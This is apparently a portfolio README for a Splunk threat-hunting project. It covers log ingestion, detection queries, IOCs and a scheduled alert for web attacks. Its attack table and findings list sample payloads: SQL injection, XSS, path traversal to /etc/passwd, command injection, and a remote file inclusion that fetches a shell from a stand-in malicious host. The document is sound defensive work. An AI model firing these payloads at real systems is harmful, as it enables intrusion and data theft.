# 🔍 Web Application Attack Detection & Threat Hunting Using Splunk

![Splunk](https://img.shields.io/badge/Splunk-Enterprise_10.2.3-black?style=flat-square&logo=splunk&logoColor=green)
![Platform](https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows)
![Role](https://img.shields.io/badge/Role-SOC_Analyst-red?style=flat-square)
![Events Analyzed](https://img.shields.io/badge/Events_Analyzed-248%2C664-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Complete-success?style=flat-square)

> A full SOC analyst workflow — log ingestion, SIEM troubleshooting, threat hunting, detection engineering, alert creation, and IOC identification — built end-to-end in Splunk Enterprise.

---

## 📋 Table of Contents

- [Project Overview](#project-overview)
- [Environment](#environment)
- [Attack Coverage](#attack-coverage)
- [Key Findings](#key-findings)
- [Detection Logic](#detection-logic)
- [Indicators of Compromise](#indicators-of-compromise)
- [Alert Configuration](#alert-configuration)
- [Repository Structure](#repository-structure)
- [Skills Demonstrated](#skills-demonstrated)

---

## Project Overview

This project simulates a real-world Security Operations Center (SOC) engagement using Splunk Enterprise to ingest, parse, and analyze malicious web application traffic from an Apache-style access log.

**Key outcomes:**
- Processed **248,664 events** across a full web attack dataset
- Identified **24 unique IP / attack-type combinations** via detection query
- Flagged a **potentially successful RCE attempt** (HTTP 200 response to command injection)
- Built and scheduled a **Critical Web Attack Detection** alert running every 1 minute

---

## Environment

| Component        | Details                             |
|------------------|-------------------------------------|
| SIEM Platform    | Splunk Enterprise 10.2.3            |
| Operating System | Windows                             |
| Data Source      | `access_log.txt`                    |
| Sourcetype       | `access_combined`                   |
| Index            | `main`                              |
| Log Type         | Web Server Access Logs (Apache CLF) |

![Splunk Overview](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/splunk_overview.png)

---

## Attack Coverage

| Attack Type                     | Example Payload                                     | Risk Level  |
|---------------------------------|-----------------------------------------------------|-------------|
| SQL Injection (SQLi)            | `/search?query=' OR '1'='1`                         | 🔴 Critical |
| Cross-Site Scripting (XSS)      | `/profile.php?name=<script>alert('XSS')</script>`  | 🟠 High     |
| Directory Traversal / LFI       | `/download?file=../../../../etc/passwd`             | 🔴 Critical |
| Command Injection / RCE         | `/exec.php?cmd=whoami;id;ls -la`                    | 🔴 Critical |
| Remote File Inclusion (RFI)     | `/page.php?url=http://malicious.com/shell.txt`      | 🔴 Critical |
| Reconnaissance / Automated Scan | Nmap Scripting Engine, sqlmap                       | 🟡 Medium   |

---

## Key Findings

### ⚠️ Critical — Potential Successful Exploitation
```
GET /exec.php?cmd=whoami;id;ls -la HTTP/1.1" 200
```
HTTP 200 returned for a command injection payload — indicates the target application may have **accepted and executed** remote commands. This warrants immediate escalation and forensic investigation.

### Attacker Behavior Pattern
- External IPs performed automated scanning followed by targeted injection
- Internal IP `10.0.0.5` exhibited suspicious command injection activity (insider threat or lateral movement)
- `sqlmap` and `Nmap` user-agents confirm tooling-assisted exploitation attempts

![Statistics View](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/statistics_view.png)

![Pattern Analysis](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/pattern_analysis.png)

---

## Detection Logic

The core SPL query is in [`queries/web_attack_detection.spl`](queries/web_attack_detection.spl).

**Logic overview:**
1. Filter events from the web log source containing attack signatures
2. Extract source IP via `rex` field extraction
3. Classify each event into an attack category via `eval/case`
4. Aggregate by `src_ip` and `attack_type` for triage

![Detection Query Results](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/detection_query_results.png)

**Index validation query** (used during SIEM troubleshooting):
```spl
index=* | stats count by index sourcetype source host
```

---

## Indicators of Compromise

### Suspicious IP Addresses

| IP Address        | Activity                        |
|-------------------|---------------------------------|
| `185.199.110.153` | Command Injection / RFI / LFI  |
| `37.49.226.150`   | SQL Injection / Recon           |
| `192.168.1.101`   | SQLi / XSS / LFI                |
| `10.0.0.5`        | Internal — Command Injection    |

### Suspicious User Agents
- `sqlmap/1.4.5-dev`
- `Nmap Scripting Engine`

Full IOC reference → [`iocs/indicators.md`](iocs/indicators.md)

---

## Alert Configuration

| Parameter     | Value                                     |
|---------------|-------------------------------------------|
| Alert Name    | Critical Web Application Attack Detection |
| Alert Type    | Scheduled                                 |
| Schedule      | Every 1 minute                            |
| Search Window | Last 5 minutes                            |
| Trigger       | Number of Results > 0                     |
| Severity      | High / Critical                           |

![Alert Creation](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/alert_creation.png)

![Triggered Alerts](https://raw.githubusercontent.com/dunsin2018/splunk-web-attack-detection/refs/heads/main/screenshots/triggered_alerts.png)

---

## Repository Structure

```
splunk-web-attack-detection/
├── README.md                    # This file
├── queries/
│   ├── web_attack_detection.spl # Primary detection query
│   └── validation_query.spl     # Index/sourcetype validation
├── docs/
│   └── SOC_Report.md            # Full SOC analyst report
├── iocs/
│   └── indicators.md            # IP addresses, user agents, payloads
└── screenshots/                 # Evidence: query results, alert config
    ├── splunk_overview.png
    ├── detection_query_results.png
    ├── statistics_view.png
    ├── pattern_analysis.png
    ├── alert_creation.png
    └── triggered_alerts.png
```

---

## Skills Demonstrated

| Domain                 | Specifics                                               |
|------------------------|---------------------------------------------------------|
| SIEM Operations        | Splunk log ingestion, index validation, troubleshooting |
| Detection Engineering  | SPL query development, regex extraction, eval logic     |
| Threat Hunting         | Pattern analysis, behavioral clustering                 |
| IOC Analysis           | IP attribution, user-agent fingerprinting               |
| Alert Development      | Scheduled alerts, trigger thresholds                    |
| Incident Response      | RCE triage, escalation criteria, HTTP status analysis   |
| Web Attack Analysis    | SQLi, XSS, LFI, RFI, RCE, Recon                        |

---

## Related Projects

- [GRC & Risk Assessment Portfolio](https://github.com/) *(link your other repos)*
- [AWS Cloud Security — NIST CSF Implementation](https://github.com/)

---

*Prepared by **Dunsin Fakorede** | SOC Analyst / Cybersecurity Enthusiast*
